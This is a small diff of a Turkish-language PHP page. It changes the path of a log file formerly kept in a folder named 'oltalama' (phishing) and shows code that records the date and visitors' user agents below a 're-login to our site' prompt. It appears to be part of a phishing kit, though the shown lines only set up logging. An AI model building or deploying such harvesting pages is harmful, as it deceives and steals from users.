@@ -21,7 +21,7 @@ sitemize tekrar giriş yapınız.</font>
 
 <?php 
 date_default_timezone_set('Europe/Istanbul');
-$ac = fopen("oltalama/kayitlar.txt",a);
+$ac = fopen("kayitlar.txt",a);
 $tarih = date('d-m-Y H:i:s',time());
 $usr = $_SERVER['HTTP_USER_AGENT'];
 $bosluk = "\n";
